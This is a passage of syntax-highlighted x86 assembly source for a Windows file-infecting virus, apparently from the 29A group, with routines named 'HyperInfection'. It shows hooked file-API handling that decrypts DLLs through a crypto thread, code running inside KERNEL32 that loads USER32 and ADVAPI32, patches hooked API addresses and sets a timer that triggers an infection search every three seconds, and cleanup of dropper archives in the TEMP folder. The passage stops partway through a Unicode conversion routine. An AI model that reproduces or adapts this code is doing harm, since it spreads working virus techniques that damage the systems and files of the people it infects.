        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">crypt_get_library</span><span class="sc0">

        </span><span class="sc1">; get filename length</span><span class="sc0">
    </span><span class="sc5">__hif_get_flen</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0000002Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get file name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddlstrlen</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;not including null terminator</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;zero length</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__hif_finish</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; + zero char</span><span class="sc0">

        </span><span class="sc1">; copy filename to the buffer</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;destination buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;filename length</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc1">; upcase characters</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;number of characters</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;filename</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCharUpperBuffA</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;convert to uppercase</span><span class="sc0">

        </span><span class="sc1">; CreateFile, OpenFile, CopyFile, MoveFile, ...</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;find the end of filename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc5">@endsz</span><span class="sc0">              </span><span class="sc1">;ehm :)</span><span class="sc0">

        </span><span class="sc1">; use crypto thread to decrypt file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'LLD.'</span><span class="sc0">      </span><span class="sc1">;DLL file ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__hif_finish</span><span class="sc0">        </span><span class="sc1">;or not ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_thread_err</span><span class="sc4">],</span><span class="sc12">'!A92'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__hif_finish</span><span class="sc0">        </span><span class="sc1">;other process ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_thread</span><span class="sc4">],</span><span class="sc5">CT_DECRYPTFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_thread_err</span><span class="sc4">],</span><span class="sc12">'!A92'</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_mainProcId</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;active the process where I</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;created my thread, I can't</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">       </span><span class="sc1">;call thread for other pro-</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddOpenProcess</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;cess, so I have to active</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;its and then go back, mul-</span><span class="sc0">
    </span><span class="sc5">__hif_cDecryptFile</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">;titasking world !!!</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddWaitForSingleObject</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_thread_err</span><span class="sc4">],</span><span class="sc12">'!A92'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__hif_cDecryptFile</span><span class="sc0">  </span><span class="sc1">;crypto thread must decrypt</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCloseHandle</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;in stack is its handle</span><span class="sc0">

    </span><span class="sc5">__hif_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ start HyperInfection inside KERNEL32.DLL ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Before then I will start I must load "USER32", "ADVAPI32"</span><span class="sc0">
        </span><span class="sc1">;libraries and  re-write all my function offsets. I do NOT</span><span class="sc0">
        </span><span class="sc1">;exactly know whether it  must be but when I'll load these</span><span class="sc0">
        </span><span class="sc1">;libraries sometimes later I should get  other offset then</span><span class="sc0">
        </span><span class="sc1">;after 1st running. Next, I must  install  timer on "Hyper</span><span class="sc0">
        </span><span class="sc1">;Infection" function.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">hookHyperInfection</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; load "USER32.DLL" library</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">user32_name</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;library name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddLoadLibraryA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;failed ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__hhi_finish</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; load "ADVAPI32.DLL" library</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">advapi32_name</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;library name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddLoadLibraryA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;failed ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__hhi_finish</span><span class="sc0">

        </span><span class="sc1">; decrease/increase function bases</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_Action</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__hhi_no_cryptography</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">advapi_base</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;new memory position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">HookedAddresses_user32</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \
                 </span><span class="sc5">HookedAddresses_advapi32</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HookedAddresses_advapi32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">__hhi_modify_advapi32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__hhi_modify_advapi32</span><span class="sc0">
    </span><span class="sc5">__hhi_no_cryptography</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">user32_base</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;new memory position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">FunctionNames</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">HookedAddresses_user32</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc5">__hhi_modify_user32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__hhi_modify_user32</span><span class="sc0">

        </span><span class="sc1">; set timer to the Prizzy Hyper Infection for API, "PHI-API"</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">init_search</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;main function</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3000</span><span class="sc0">            </span><span class="sc1">;every 3 seconds :)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;timer identifier</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;hwnd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddSetTimer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__hhi_finish</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HyperInfection_timerID</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_start</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;PHI didnt begin</span><span class="sc0">

    </span><span class="sc5">__hhi_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HyperInfection_k32</span><span class="sc4">],</span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ finish HyperInfection inside KERNEL32.DLL ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">hookHyperInfection_Done</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; remove timer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HyperInfection_timerID</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddKillTimer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ common standard functions ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;After every start  of windows I compress some programs to</span><span class="sc0">
        </span><span class="sc1">;TEMP directory (usually four new achives). And every win-</span><span class="sc0">
        </span><span class="sc1">;dows run I have to delete them.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__ctd_memory</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;place in memory</span><span class="sc0">
        </span><span class="sc5">__ctd_fmask</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'29A*.TMP'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;file mask</span><span class="sc0">
        </span><span class="sc5">__ctd_fmask_len</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">__ctd_fmask</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">clear_temp_droppers</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; allocate moemory for TEMP directory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">filename_size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ctd_memory</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; get two TEMP directory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;outta buffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">filename_size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddGetTempPathA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;give me filepath length</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ctd_dealloc</span><span class="sc0">

        </span><span class="sc1">; copy filemask in the end of filename</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ctd_fmask</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;file mask</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ctd_memory</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;outta buffer</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; + length of dir name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">__ctd_fmask_len</span><span class="sc0"> </span><span class="sc1">;length of file mask</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">;copy me, my lord :) !</span><span class="sc0">

        </span><span class="sc1">; search them</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;i can use "infect_file" dta</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ctd_memory</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;temp directory + file mask</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyFindFirst</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__ctd_dealloc</span><span class="sc0">

        </span><span class="sc1">; delete file</span><span class="sc0">
    </span><span class="sc5">__ctd_next_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;find handle</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_filename</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ctd_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; + length of dir name</span><span class="sc0">
        </span><span class="sc5">@copysz</span><span class="sc0">             </span><span class="sc1">;ahhh, JQwerty's macro :)</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ctd_memory</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;filename</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddDeleteFileA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; search next file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;find handle</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;dta</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyFindNext</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__ctd_next_file</span><span class="sc0">

        </span><span class="sc1">; close find handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyFindClose</span><span class="sc0">       </span><span class="sc1">;find next file !</span><span class="sc0">

    </span><span class="sc5">__ctd_dealloc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ctd_memory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
    </span><span class="sc5">__ctd_failed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Clear all archive structures, all droppers, all programs.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">clear_valuez</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewArchive</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NewArchiveNum</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">NewArchiveSize</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc1">; set libraries memory, info</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_infected</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_library</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_nLib</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">

        </span><span class="sc1">; clear HyperTable</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HyperTable</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">__cv_repeat</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">;name or extension or end ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cv_finish</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddlstrlen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">    </span><span class="sc1">;get filename</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;zero char</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;search flag !</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">HyperTable_HalfSize</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cv_repeat</span><span class="sc0">
    </span><span class="sc5">__cv_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Convert Unicode filename to Ansi version.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">unicode2ansi</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000034h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;UniCode filename</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;don't tell me about problem</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;ignore unmappable characters</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">        </span><span class="sc1">;how many bytes to allocate</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;destination buffer</span><span class="sc0">
